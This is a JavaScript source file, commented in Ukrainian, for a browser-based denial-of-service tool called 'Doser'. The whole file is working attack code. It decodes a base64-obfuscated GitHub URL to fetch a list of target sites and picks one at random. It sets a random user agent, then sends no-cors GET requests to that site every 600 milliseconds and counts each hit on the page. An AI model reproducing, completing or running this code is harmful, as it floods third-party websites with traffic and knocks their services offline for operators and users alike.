// @ts-nocheck

/**
 * @typedef {Object} Target Ціль
 * @property {string} page Сайт, який треба дудосити
 * @property {"GET" | "POST"} method  Метод для атаки
 */ 


/**
 * # Інструменти
 */
const Tools = {
	/**
	 * Зберігання данних про атаки
	 */
	addCount() {
		$("#attacks").text((+$("#attacks").text()) + 1);
		++Database.attacks
	},
 
	/**
	 * Показ цілі користувачу
	 * 
	 * @param {Target} target
	 */
	setTarget(target) {
		$("#target").text(target.page);
		$("#method").text(target.method)
	},

	/**
	 * Завантажувач цілей
	 * 
	 * @returns {Promise<Target>}
	 */
	async getTargets() {
		// Завантаження цілей
		// Кешування вимкнено
		return await fetch(Doser.targetSource, {cache: 'no-cache'})
			.then(async function(response) {
				console.log(response)
				const data = JSON.parse(atob(await response.text()));

				/**@type Target[] */
				let targets = [];

				// Фільтрування цілей
				for (let i in data) {
					if (['post', 'get'].includes(data[i].method)) {
						targets.push(data[i])
					}
				};
				$("#load").remove();
				
				return randomChoice(targets) // Рандомна ціль
			}, () => {})
	}
}


/**
 * # Воркер
 */
class Doser {
	/**
	 * Конструктор досера
	 * 
	 * TODO: Доробити SFX
	 * 
	 * @constructor
	 */
	constructor() {
		/** Стан атаки */
		this.attack = false
		/** Інтервал для `fetch` атаки */
		this.attackInterval = 600;
		this.targetSource = atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h6eWFsbHpqeC0yMzEvaW91empsYS02MTIvbWFpbi80MC5qc29u');
	};

	go() {
		this.attack ? this.stop() : this.start()
	}

	/**
	 * Запуск атаки
	 */
    async start() {
		if (!this.attack) {
			this.attack = true;
			$("#button").text("Стоп");

			// Створення сповіщення про завантаження цілей
			// Тут теж буде рефакторинг
			(l => {if (l[0]) l.remove()})($("#load"));

			// Завантаження цілей

			$("<p>", {id: "load"})
			.text("Завантажуємо цілі...")
			.appendTo($("#box"));


			this.target = await Tools.getTargets();

			console.log(this.target)

			// Якщо цілі не завантажились
			if (!this.target) {
				// Якщо не завнтажились цілі

				$("#load").text("Помилка завантаження!");
				swal("Помилка!",
					"Перевірте підключення до інтернету!",
					"error"
				);

				this.attack = false;
				$("#button").text("Старт!");
				return // Стоп
			};

			// Показ цілей
			Tools.setTarget(this.target);
			console.log(this.target);


			// Видаємо юзерагент
			const UserAgent = await getRandomUseragent();
			console.log(UserAgent)

			// Старт атаки

			// TODO: ЗРОБИТИ РЕКУРСИВНИЙ TIMEOUT!
			let attack = async () => {
				await fetch(this.target.page, {
					method: "GET",
					mode: 'no-cors',
					referrerPolicy: 'no-referrer',
					headers: {
						"User-Agent": UserAgent
					},
					cache: 'no-cache'
				})
				.then(() => Tools.addCount(),
					  () => Tools.addCount());

			};

			this.interval = setInterval(attack, this.attackInterval)
		}
    };
	/**
	 * Зупинка атаки
	 */
    stop() {
    	if (this.interval && this.attack) {
	    	this.attack = false;
	    	clearInterval(this.interval);
	    	console.clear();
	    	$("#button").text("Старт!")
    	}
    }
}